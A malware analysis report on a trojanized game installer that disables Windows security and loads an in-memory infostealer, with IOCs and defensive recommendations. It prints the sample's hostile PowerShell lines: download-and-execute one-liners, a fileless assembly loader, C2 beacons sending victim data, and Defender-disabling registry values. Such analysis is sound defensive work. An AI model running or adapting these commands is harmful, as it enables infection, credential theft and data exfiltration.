# DDinosaur.exe — Malware Analysis Report
**Date**: 2026-03-03
**Analyst**: REMnux MCP

---

## File Metadata

| Field | Value |
|-------|-------|
| File | DDinosaur.exe |
| SHA256 | aad8c636482191726caefd45585949710c9c2d7640670f3f2179617d53cc15a7 |
| SHA1 | 94c04bfbe1feef73fe54c0355791bca9b5506dcb |
| MD5 | ed5c280fbd057c23a809c070c6cc51a6 |
| Size | 2,678,832 bytes (~2.6 MB) |
| Type | PE32 GUI, Intel i386, Windows |
| Compiler | Microsoft Visual C/C++ 2019 (14.26.28806, LTCG/C++) |
| PE Timestamp | 2020-06-17 09:40:36 UTC (AI stub compile date) |
| File Date | 2026-03-03 (today — freshly created sample) |
| Sections | 5: .text, .rdata, .data, .rsrc (615 KB), .reloc |
| PDB Path | `C:\JobRelease\win\Release\stubs\x86\ExternalUi.pdb` |

---

## Classification

**Type**: Caphyon Advanced Installer web/multi-file installer stub weaponized as malware dropper
**Verdict**: **HIGH SUSPICION — Malicious Dropper**
**Confidence**: HIGH (short-lived cert from individual signer; unknown encrypted MSI payload)

---

## Key Findings

### 1. Framework Identification

The file is the **ExternalUi stub** from Caphyon Advanced Installer, a legitimate commercial Windows installer framework. Key identifiers:
- PDB path `C:\JobRelease\win\Release\stubs\x86\ExternalUi.pdb` — canonical Advanced Installer build path
- Registry key `Software\Caphyon\Advanced Installer\`
- Resource names `AI_InstallLanguage`, `AI_PreRequisite`
- String `"Unmatching digital signature between EXE bootstrapper and MSI database"`
- Standard installer UI resources: dialogs, bitmaps, icons, string tables

The framework is legitimate. The actor is **abusing it as a malware delivery vehicle**.

### 2. Digital Signature — Critical Red Flag

The file is signed using **Microsoft Trusted Signing** (AOC — Azure Code Signing) via a short-lived certificate:

```
Subject:  C=US, ST=South Carolina, L=Johnston, O=Ricardo Reis, CN=Ricardo Reis
Issuer:   C=US, O=Microsoft Corporation, CN=Microsoft ID Verified CS AOC CA 01
Valid:    2026-02-28 15:32:39 UTC -> 2026-03-03 15:32:39 UTC  (3-DAY CERT)
Root:     Microsoft Identity Verification Root Certificate Authority 2020
```

The certificate was valid for only **3 days** and expires on the same day this sample was submitted for analysis. Signing under a personal name via Microsoft's AOC (Azure Code Signing) service produces a valid Microsoft-rooted signature while requiring minimal identity verification. A 3-day window significantly limits the time available for certificate revocation to be effective.

### 3. Payload Architecture — Missing MSI

This stub is designed to deliver `DDinosaur_Data\resources.msi`. The MSI is **not embedded** in DDinosaur.exe:

**Overlay structure** (appended after PE sections):
```
Offset 0x28a000  [402 bytes]  UTF-16 LE INI config:
    [GeneralOptions]
    DownloadFolder=[AppDataFolder]DDinosaur with Double Ds\DDinosaur\prerequisites
    DefaultProdCode={79D82FEA-28B5-40D4-8A78-00521150AA99}
    MsiCertData=999ca15c8838ae46bab0c0cd8fc4fc29    <- MD5 of the MSI

Offset 0x28a192  [~94 bytes]  File table metadata:
    Entry 0: DDinosaur.ini
    Entry 1: DDinosaur_Data\resources.msi

Offset 0x28a250  [15840 bytes] Authenticode PKCS7 signature (fills to EOF)
```

The `MsiCertData` MD5 (`999ca15c8838ae46bab0c0cd8fc4fc29`) is used to verify the MSI after download/placement.

**Payload delivery mechanisms** (based on string analysis):
- The installer supports **AES-256 encrypted packages** with password-based decryption
- Has an **auto-update downloader** ("There is a newer version...")
- Supports HTTP HEAD/GET/POST download with `.part` partial-file support
- The download URL is **not present as plaintext** — likely encrypted in the binary code or configured server-side
- Prerequisites downloaded to `%APPDATA%\DDinosaur with Double Ds\DDinosaur\prerequisites`

### 4. Capabilities (from YARA behavioral rules)

| Rule | Significance |
|------|--------------|
| `anti_dbg` | Anti-debugging — IsDebuggerPresent confirmed at offset 0x1d4bc0 |
| `antisb_threatExpert` | Anti-sandbox evasion |
| `disable_antivirus` | Patterns suggesting AV-disable capability |
| `keylogger` | Keylogging-related code patterns |
| `screenshot` | Screenshot capability patterns |
| `network_http` | HTTP networking (WinInet: HttpOpenRequest, HttpSendRequest) |
| `escalate_priv` | Privilege escalation (UAC: requireAdministrator) |
| `win_registry` | Registry operations |
| `win_token` | Token manipulation |
| `MD5_Constants`, `BASE64_table` | Crypto primitives |

> Note: Some hits (screenshot, keylogger, escalate_priv) may originate from the Advanced Installer framework itself. The most meaningful standalone hits are `anti_dbg`, `antisb_threatExpert`, and `disable_antivirus`.

### 5. Version Info

```
CompanyName:     DDinosaur with Double Ds
FileDescription: DDinosaur Installer
ProductName:     DDinosaur
FileVersion:     1.0.0
Copyright:       Copyright (C) 2026 DDinosaur with Double Ds
OriginalFile:    DDinosaur.exe
```

The PE compile timestamp says 2020-06-17 (the AI stub's original compile date, not the packaging date).
The EULA resource (RTF) contains only the text "EULA" — a placeholder, suspicious for a legitimate product.

---

## IOCs

| Type | Value | Note |
|------|-------|------|
| SHA256 | `aad8c636482191726caefd45585949710c9c2d7640670f3f2179617d53cc15a7` | DDinosaur.exe |
| MD5 | `ed5c280fbd057c23a809c070c6cc51a6` | DDinosaur.exe |
| SHA1 | `94c04bfbe1feef73fe54c0355791bca9b5506dcb` | DDinosaur.exe |
| MD5 | `999ca15c8838ae46bab0c0cd8fc4fc29` | Expected MSI companion file |
| GUID | `{79D82FEA-28B5-40D4-8A78-00521150AA99}` | MSI ProductCode |
| Path | `%APPDATA%\DDinosaur with Double Ds\DDinosaur\prerequisites\` | Prerequisite drop path |
| Path | `DDinosaur_Data\resources.msi` | Expected companion MSI |
| Cert CN | `Ricardo Reis` | Signing cert subject |
| Cert Loc | `Johnston, SC, US` | Signing cert location |
| Cert Range | `2026-02-28 -> 2026-03-03` | 3-day cert window |

---

## MSI Payload Analysis: `resources.msi`

| Field | Value |
|-------|-------|
| SHA256 | 40d74f649d3d4c1a38f6d804efa77d99343e94fae22f2e16b845f381d9c217b4 |
| MD5 | 6c5bb2e1e662320076fb9d034e551c5a |
| Size | 3,697,152 bytes (~3.5 MB) |
| Format | OLE2 Composite Document / Windows Installer (.msi) |
| Builder | Advanced Installer 17.1.2 build 64c1c160 |
| ProductCode | {79D82FEA-28B5-40D4-8A78-00521150AA99} |
| UpgradeCode | {2D5F1890-1DA1-4B1E-BED5-B3DD2558087A} |
| Not encrypted | Confirmed (oleid: Encrypted=False) |

> Note: MD5 does not match the `MsiCertData` value in the stub's INI (`999ca15c...`). The MSI was likely decrypted/modified before submission. The stub expected an AES-256 encrypted version on disk.

### Lure: Unity Game Installation

The MSI installs a functioning Unity 2022.3.x game ("DDinosaur") as the lure, providing the victim with a plausible explanation for the installer:

- `DDinosaur.exe` (674 KB, Unity 2022.3.23.46071)
- `UnityPlayer.dll` (30 MB), full Unity runtime
- Game asset bundles: `ddinosaur-default`, `ddinosaur-lingerie`, `ddinosaur-succubus`, `ddinosaur-wedding`, `ddinosaur-badpak`, `ddinosaur-sicko`
- `TwitchLib` integration (Twitch API v3.2.x)
- `steam_api64.dll` (Steamworks 8.33.9)
- Localizations: English, German, French, Spanish, Italian, Japanese, Russian, Dutch, Chinese Simplified
- 12 game levels + shared assets

The game appears to be adult-themed content (indicated by bundle names). It is likely pirated or cracked software being used as a delivery vehicle.

### Attack Execution Chain

All malicious actions are registered in `InstallExecuteSequence` with condition `NOT Installed`, running silently at the end of installation (sequences 6601–6604):

```
Seq 6600  InstallFinalize        (normal MSI completion)
Seq 6601  KillDefender           disable Windows Defender/AV
Seq 6602  AI_DATA_SETTER_1       load PowerShell payload into property
Seq 6603  PowerShellScriptInline execute PowerShell payload
Seq 6604  LaunchFile_2           install chained second MSI silently
```

### Custom Action: `KillDefender` (Seq 6601)

Runs via `viewer.exe_1` (embedded AI process launcher, elevated, hidden window):

```
powershell.exe -ep Bypass -c "& ([ScriptBlock]::Create((irm https://dnot.sh/))) --silent --disable-autorun"
```

Downloads and executes the content of `https://dnot.sh/` as a ScriptBlock. The `--disable-autorun` flag suppresses interactive prompts. This is a dedicated Windows Defender / AV killer script.

### Custom Action: PowerShell Payload (Seq 6602–6603)

The full PowerShell script stored in `AI_DATA_SETTER_1` and executed by `PowerShellScriptInline`:

**Step 1 — Victim reconnaissance:**
```powershell
function G {
    $o = (gcim Win32_OperatingSystem).Caption -replace '\s+','%20'
    $d = (gcim Win32_ComputerSystem).Domain
    $a = (gcim -Namespace root/SecurityCenter2 -ClassName AntiVirusProduct).displayName -join ', '
    @{O=$o; D=$d; A=$a}
}
```
Collects: OS name, domain membership, installed AV product names.

**Step 2 — Download chained MSI (disguised as Edge updater):**
```powershell
(New-Object Net.WebClient).DownloadFile(
    'https://main45.b-cdn.net/new26/MicrosoftEdgeUpdateTaskMachineCoreC.msi',
    'C:\ProgramData\MicrosoftEdgeUpdateTaskMachineCoreB.msi'
)
```

**Step 3 — C2 registration and victim profiling:**

The C2 URL is obfuscated as a char integer array:
`[char[]](104,116,116,112,115,58,47,47,110,101,107,108,101,114,115,109,101,97,112,46,99,111,109)` → `https://neklersmeap.com`

```powershell
# Registration beacon
iwr "https://neklersmeap.com/?status=reg&key=9iwuerfszxlxc&site=Car_DDinosaur"

# Victim profile exfiltration
irm "https://neklersmeap.com/?status=start&av=<AV>&os=<OS>&domain=<DOMAIN>"
# If server returns HTTP 503 → exit (operator gating / sandbox evasion)

# Completion signal
iwr "https://neklersmeap.com/?status=install"
```

**Campaign identifiers:**
- API key: `9iwuerfszxlxc`
- Site/campaign tag: `Car_DDinosaur`

**Step 4 — In-memory PowerShell stage:**
```powershell
powershell -nop -ep bypass -c "(New-Object Net.WebClient).DownloadString('https://main45.b-cdn.net/new26/monitor') | iex"
```
Downloads and executes an arbitrary PowerShell script from the CDN (`monitor`). Content unknown.

**Step 5 — Fileless AES-256-CBC encrypted .NET assembly:**
```powershell
$k = [byte[]](0x2B,0x7E,...,0xC7)   # 32-byte AES-256 key
$v = [byte[]](0,1,2,...,15)          # 16-byte IV
$e = (New-Object Net.WebClient).DownloadData('https://main45.b-cdn.net/new26/new30h.jar')
# AES-256-CBC decrypt $e → $b
[Reflection.Assembly]::Load($b).EntryPoint.Invoke($null, @())
```
Downloads `new30h.jar` (a .NET assembly disguised with a `.jar` extension), decrypts it in-memory using AES-256-CBC, and directly loads and executes it via `Assembly.Load()` — fully fileless, no disk artefact.

AES parameters:
- Key: `2b7e151628aed2a6abf7158809cf4f3c762e7160f38b4da16c940a258f4a89c7`
- IV: `000102030405060708090a0b0c0d0e0f`
- Mode: CBC

### Custom Action: `LaunchFile_2` (Seq 6604)

```
msiexec.exe /i "C:\ProgramData\MicrosoftEdgeUpdateTaskMachineCoreB.msi" /qn /norestart
```
Silently installs the second-stage MSI that was downloaded in Step 2.

### Registry: Comprehensive Security Disablement

The MSI writes over 100 registry values systematically dismantling Windows security. Key categories:

**Windows Defender — Real-Time Protection (disabled):**
- `DisableRealtimeMonitoring = 1`
- `DisableBehaviorMonitoring = 1`
- `DisableIOAVProtection = 1`
- `DisableIntrusionPreventionSystem = 1`
- `DisableOnAccessProtection = 1`
- `DisableScanOnRealtimeEnable = 1`

**Windows Defender — Policy overrides:**
- `DisableAntiSpyware = 1`
- `DisableAntiVirus = 1`
- `DisableBlockAtFirstSeen = 1`
- `SpynetReporting = 0` (cloud protection off)
- `ExploitGuard_ASR_Rules = 0` (ASR rules disabled)
- `EnableControlledFolderAccess = 0`
- `EnableNetworkProtection = 0`

**Defender Exclusions added:**
- Processes: `powershell.exe`, `rundll32.exe`, `mshta.exe`, `regasm.exe`
- Extensions: `.exe`, `.tmp`
- Paths: `%ProgramData%`, `%Windows%\Installer`, entire Windows volume

**Notification suppression:**
- `DisableEnhancedNotifications = 1`
- `DisableNotifications = 1`
- `SuppressRebootNotification = 1`
- `SettingsPageVisibility = hide:windowsdefender` (hides Defender from Settings)

**SmartScreen disabled:**
- `SmartScreenEnabled = off`
- `EnableSmartScreen = 0`
- `ConfigureAppInstallControlEnabled = 1` / `ConfigureAppInstallControl = Anywhere`
- `AllowSmartScreen = 0`

**UAC weakened:**
- `ConsentPromptBehaviorAdmin = 0` (auto-elevate without prompt)
- `ConsentPromptBehaviorUser = 0`
- `EnableLUA = 0` (UAC fully disabled)
- `LocalAccountTokenFilterPolicy = 1` (enables pass-the-hash)
- `FilterAdministratorToken = 1`

**Security infrastructure disabled:**
- `RunAsPPL = 0` (LSA protection off — enables credential dumping)
- `EnableVirtualizationBasedSecurity = 0` (VBS off)
- `Locked (HVCI) = 0` (Hypervisor Code Integrity off)
- `VerifiedAndReputablePolicyState = 0` (Code Integrity Policy off)
- `VulnerableDriverBlocklistEnable = 0` (allows vulnerable kernel drivers)
- `KernelSEHOPEnabled = 0` (SEHOP exploit mitigation off)
- `Microsoft Security Center: AntiVirusOverride = 1`, `FirewallOverride = 1`
- `Registered (Windows Security Health) = 0`

---

## Stage 5 Payload: `new30h.jar` — WbElevation Infostealer

### Encryption Wrapper

`new30h.jar` is **not a Java archive**. The `.jar` extension is a decoy. The file is a raw AES-256-CBC ciphertext blob, decrypted entirely in memory by the PowerShell dropper (Step 5) using the hardcoded key and IV embedded in the MSI. No copy of the decrypted payload is ever written to disk under normal execution.

| Field | Value |
|-------|-------|
| File | `new30h.jar` (encrypted container) |
| SHA256 (encrypted) | `eef75cbcb92e9df84000cac59c54d7ea583dfd4cf42b8b33fd395862815d225e` |
| MD5 (encrypted) | `0e6440991aeb41f66cf74f0ee9ca48eb` |
| Size | 764,944 bytes |
| Encryption | AES-256-CBC, key and IV hardcoded in MSI PowerShell payload |

### Decrypted Payload

| Field | Value |
|-------|-------|
| SHA256 (decrypted) | `9729471bcf6a52f79ed876fdd8dfcc53150dfe94176fbaae42dd4ef510871bba` |
| MD5 (decrypted) | `e27f682185c6ac8c85c5ae18d955230f` |
| Type | PE32+ GUI, AMD64, .NET Framework 4.8 (CLR v4.0.30319) |
| Internal name | `we4ftg.exe` / PDB: `we4ftg.pdb` |
| PE Timestamp | 2043-12-16 (intentionally far-future bogus timestamp) |
| File version | 11.0.0.7 / Assembly version 432.0.4.0 (fake/random) |
| Description / ProductName / Company | `WERHBQAER5GE` (random junk string) |
| Protector | **.NET Reactor 6.X (Unregistered)** — Control Flow + Anti-Tamper + Anti-ILDASM |

The use of an "Unregistered" .NET Reactor build is consistent with cracked tooling; no legitimate licence identifier is embedded.

### Family Identification

The decrypted assembly is a **custom infostealer** with the root class `WbElevation.BrowserKeyDecryptor`. It does not match any known public infostealer family by name or YARA family signature; the project name `WbElevation` appears to be actor-specific and has not been previously documented.

YARA matches (behavioral, not family-attributing): `DebuggerCheck__QueryInfo`, `inject_thread`, `Big_Numbers1/3`, `MD5_Constants`, `IsPacked`, `ImportTableIsBad`. YARA-forge family match: `COD3NYM_Reactor_Indicators` (.NET Reactor protector detection only).

### Execution Flow

```
Main()  [async, WbElevation.BrowserKeyDecryptor]
  │
  ├─ AntiSNG.CheckAndExitIfRussian()
  │    GetKeyboardLayoutList / GetKeyboardLayout (user32.dll)
  │    Exits if any installed keyboard layout is Russian/CIS (SNG = СНГ)
  │
  ├─ Network.CheckAsync()  → bool checkOk
  │    C2 connectivity check; exits if unreachable (sandbox/sinkhole evasion)
  │
  ├─ [4 parallel tasks, DisplayClass1_0]
  │    ├─ Task 1: browser stealing
  │    │    GetAllBrowsers() → BrowserKeyDecryptor (key decryption)
  │    │    Config.AppBoundBrowsers  (Chromium-family: multiple browsers)
  │    │    Config.DpapiBrowsers     (DPAPI-protected browsers)
  │    │
  │    ├─ Task 2: Firefox
  │    │    FirefoxJsonParser.ParseLogins()
  │    │    Extracts: Hostname, EncryptedUsername, EncryptedPassword
  │    │
  │    ├─ Task 3: wallets
  │    │    Wallet.ExtractWallets()
  │    │    4 wallet dictionaries (nnSavZri0, wJIG2nvR5, jfCKRHFxD, rx7wK9IXe)
  │    │    Covers: browser extension wallets, standalone wallet apps,
  │    │             wallet data files, seed phrase files
  │    │
  │    ├─ Task 4: document collection
  │    │    CollectAndSendDocuments() → DocumentsCollector.CollectDocuments()
  │    │    Walks filesystem; collects files matching encrypted extension list
  │    │    (3 extensions stored in ThVv0rUUh, decrypted at runtime)
  │    │
  │    └─ Task 5: injection + keylogging
  │         DoInject() → SharpInjector.Inject(PID, ...)
  │         HeavensGate (Heaven's Gate 32→64 technique)
  │         NtCreateThreadEx (ntdll.dll, direct syscall)
  │         StringBuilder <keys> = keylogger capture buffer
  │
  ├─ Info.SendInfoAsync()
  │    Exfiltrates system information (StringBuilder UoJoyLJRm)
  │
  └─ Network.UploadFileAsync(byte[] data, int type)
       Network.UploadTextAsHexAsync(string text, int type)
       Typed upload protocol — int type distinguishes data categories
       HttpClient timeout: 300 seconds; retry with delay array
```

### Capabilities Detail

**1. CIS/Russian locale evasion**
`AntiSNG.CheckAndExitIfRussian()` enumerates keyboard layouts via `GetKeyboardLayoutList`/`GetKeyboardLayout`. If a Russian or CIS-associated layout is detected the process terminates immediately. This is a standard technique to protect the malware operator's home region from accidental targeting.

**2. Chromium browser credential theft**
`WbElevation.BrowserKeyDecryptor` decrypts the AES-GCM browser master key (extracted from `Local State`) then reads and decrypts `Login Data` and `Cookies` SQLite databases. `Config.AppBoundBrowsers` maps browser names to CLSID, IID, registry path, and user data path — indicating support for multiple Chromium-based browsers. `Config.DpapiBrowsers` handles older DPAPI-encrypted credential stores.

**3. Firefox credential theft**
`FirefoxJsonParser.ParseLogins()` parses Firefox's `logins.json`, yielding structured `FirefoxLoginEntry` objects with `Hostname`, `EncryptedUsername`, and `EncryptedPassword` fields. NSS-based decryption is expected in the obfuscated method bodies.

**4. Cryptocurrency wallet theft**
`Wallet.ExtractWallets()` populates four dictionaries, each covering a different wallet category. The dictionaries use runtime-decrypted strings (XOR) so exact wallet names are not statically recoverable, but the method count and structure (path-based lookup with multiple read strategies) is consistent with broad-coverage wallet stealers targeting MetaMask, Exodus, Atomic, Electrum, and similar.

**5. Document collection**
`DocumentsCollector.CollectDocuments()` recursively enumerates the filesystem (safe iterator pattern) and returns `Dictionary<string, byte[]>` — filename → content. The target file extension list (3 entries in `ThVv0rUUh`) is runtime-decrypted and cannot be resolved statically.

**6. Process injection + keylogging**
`DoInject()` uses `SharpInjector` (an open-source .NET process injection library) combined with `HeavensGate` (WOW64 heaven's gate technique for 32→64 bit address space access) and `NtCreateThreadEx` for stealth thread creation. The `StringBuilder <keys>` variable in the `<DoInject>d__7` state machine is the keylogger buffer; `UploadTextAsHexAsync` is used to transmit captured keystrokes as hex-encoded text.

**7. UAC bypass / low-integrity process launch**
`LowStart` uses `SaferCreateLevel` + `SaferComputeTokenFromLevel` + `CreateProcessAsUser` (advapi32 SAFER API) to spawn processes with a reduced token — enabling injection into lower-integrity targets or to launch post-exploitation tools without triggering UAC prompts.

**8. C2 exfiltration**
`Network` holds 4 encrypted URL constants (`tOd027U0gK`, `OJ20Ueskcw`, `A6y0Z1njvg`, `INU0FCRxLK`) decoded at runtime via XOR — the C2 base URL and endpoint paths are not statically recoverable. A single `HttpClient` instance (timeout 300s) is used for all uploads. The typed `int type` parameter on `UploadFileAsync` allows the C2 panel to categorise received data by type (browsers, wallets, documents, keylog).

**9. Anti-analysis**
- **.NET Reactor 6.X**: Control Flow obfuscation scrambles all method bodies into switch-state-machine form; Anti-Tamper prevents patching; Anti-ILDASM blocks direct disassembly
- **Debugger check**: `DebuggerCheck__QueryInfo` YARA hit; `Debuggable` attribute set to `IgnoreSymbolStoreSequencePoints`
- **Date validity check**: `new DateTime(2026, 2, 18)` in module constructor — assembly may abort execution if the system date is before this threshold
- **Future PE timestamp**: 2043-12-16 defeats timestamp-based triage heuristics
- **Junk metadata**: All version fields set to `WERHBQAER5GE` to prevent company/product name lookups

---

## Complete IOC List

### resources.msi
| Type | Value | Note |
|------|-------|------|
| SHA256 | `40d74f649d3d4c1a38f6d804efa77d99343e94fae22f2e16b845f381d9c217b4` | resources.msi |
| MD5 | `6c5bb2e1e662320076fb9d034e551c5a` | resources.msi |

### Network
| Type | Value | Note |
|------|-------|------|
| URL | `https://neklersmeap.com/?status=reg&key=9iwuerfszxlxc&site=Car_DDinosaur` | C2 registration |
| URL | `https://neklersmeap.com/?status=start` | C2 victim profile upload |
| URL | `https://neklersmeap.com/?status=install` | C2 install complete |
| URL | `https://main45.b-cdn.net/new26/MicrosoftEdgeUpdateTaskMachineCoreC.msi` | Chained MSI download |
| URL | `https://main45.b-cdn.net/new26/monitor` | PowerShell second stage |
| URL | `https://main45.b-cdn.net/new26/new30h.jar` | AES-encrypted .NET assembly |
| URL | `https://dnot.sh/` | AV killer script |
| Domain | `neklersmeap.com` | C2 domain |
| Domain | `main45.b-cdn.net` | CDN hosting payloads |
| Domain | `dnot.sh` | AV killer host |

### new30h.jar (Stage 5 infostealer)
| Type | Value | Note |
|------|-------|------|
| SHA256 | `eef75cbcb92e9df84000cac59c54d7ea583dfd4cf42b8b33fd395862815d225e` | new30h.jar (AES-encrypted) |
| MD5 | `0e6440991aeb41f66cf74f0ee9ca48eb` | new30h.jar (AES-encrypted) |
| SHA256 | `9729471bcf6a52f79ed876fdd8dfcc53150dfe94176fbaae42dd4ef510871bba` | Decrypted payload (we4ftg.exe) |
| MD5 | `e27f682185c6ac8c85c5ae18d955230f` | Decrypted payload |
| PDB | `we4ftg.pdb` | Internal build artefact |
| GUID | `07af47a7-5b08-4a9f-8f77-09fffa6ad3c4` | Assembly GUID |

### Cryptographic
| Type | Value | Note |
|------|-------|------|
| AES-256 Key | `2b7e151628aed2a6abf7158809cf4f3c762e7160f38b4da16c940a258f4a89c7` | Decrypts new30h.jar |
| AES IV | `000102030405060708090a0b0c0d0e0f` | CBC IV |

### Campaign
| Type | Value | Note |
|------|-------|------|
| API key | `9iwuerfszxlxc` | C2 authentication token |
| Campaign tag | `Car_DDinosaur` | Operator site/campaign label |

### Host
| Type | Value | Note |
|------|-------|------|
| File | `C:\ProgramData\MicrosoftEdgeUpdateTaskMachineCoreB.msi` | Dropped second-stage MSI |
| Path | `%APPDATA%\DDinosaur with Double Ds\DDinosaur\prerequisites\` | Prerequisite drop path |
| GUID | `{79D82FEA-28B5-40D4-8A78-00521150AA99}` | MSI ProductCode |
| GUID | `{2D5F1890-1DA1-4B1E-BED5-B3DD2558087A}` | MSI UpgradeCode |

### DDinosaur.exe (stub)
| Type | Value | Note |
|------|-------|------|
| SHA256 | `aad8c636482191726caefd45585949710c9c2d7640670f3f2179617d53cc15a7` | DDinosaur.exe |
| MD5 | `ed5c280fbd057c23a809c070c6cc51a6` | DDinosaur.exe |
| Cert CN | `Ricardo Reis` | Signing cert subject |
| Cert Loc | `Johnston, SC, US` | Signing cert location |
| Cert Range | `2026-02-28 → 2026-03-03` | 3-day cert window |

---

## Assessment & Next Steps

**Risk**: CRITICAL — full-featured malware delivering AV disablement, fileless in-memory .NET payload, system-wide security bypass, and a chained second-stage MSI, all hidden inside a legitimate-looking game installer.

**Summary of infection outcome on a victim machine:**
1. Unity game ("DDinosaur") installed as lure — victim sees a working game
2. Windows Defender and all AV protections disabled via 100+ registry keys
3. UAC, LSA protection, HVCI, VBS, and SmartScreen all disabled
4. `WbElevation` infostealer (`we4ftg.exe`) loaded entirely in-memory from decrypted `new30h.jar`:
   - Exits if Russian/CIS keyboard layout detected (operator region protection)
   - Steals Chromium browser credentials and cookies (all installed Chromium-family browsers)
   - Steals Firefox saved logins (`logins.json`)
   - Steals cryptocurrency wallet data (browser extensions + standalone wallets)
   - Collects documents matching target extensions
   - Injects into running processes and starts a keylogger
   - Exfiltrates all stolen data to an encrypted C2 (URL not statically recoverable)
5. Arbitrary PowerShell monitor script executed from CDN (`monitor`, content unknown)
6. Second-stage MSI `MicrosoftEdgeUpdateTaskMachineCoreB.msi` installed silently
7. C2 `neklersmeap.com` receives victim OS, domain, and AV product details

**Recommended actions**:
1. Block domains: `neklersmeap.com`, `main45.b-cdn.net`, `dnot.sh`
2. Block file hashes: `40d74f649d3d4c1a38f6d804efa77d99343e94fae22f2e16b845f381d9c217b4` (resources.msi), `eef75cbcb92e9df84000cac59c54d7ea583dfd4cf42b8b33fd395862815d225e` (new30h.jar), `9729471bcf6a52f79ed876fdd8dfcc53150dfe94176fbaae42dd4ef510871bba` (decrypted infostealer)
3. Hunt for `C:\ProgramData\MicrosoftEdgeUpdateTaskMachineCoreB.msi` on endpoints
4. Hunt for registry key `HKLM\SOFTWARE\Policies\Microsoft\Windows Defender\DisableAntiSpyware = 1`
5. Alert on `irm https://dnot.sh/` in PowerShell script block logs
6. Alert on `status=reg&key=9iwuerfszxlxc` in proxy/DNS logs
7. Treat any system that ran this installer as fully compromised: all browser credentials, cookies, crypto wallets, and documents should be considered exfiltrated; all saved passwords must be rotated
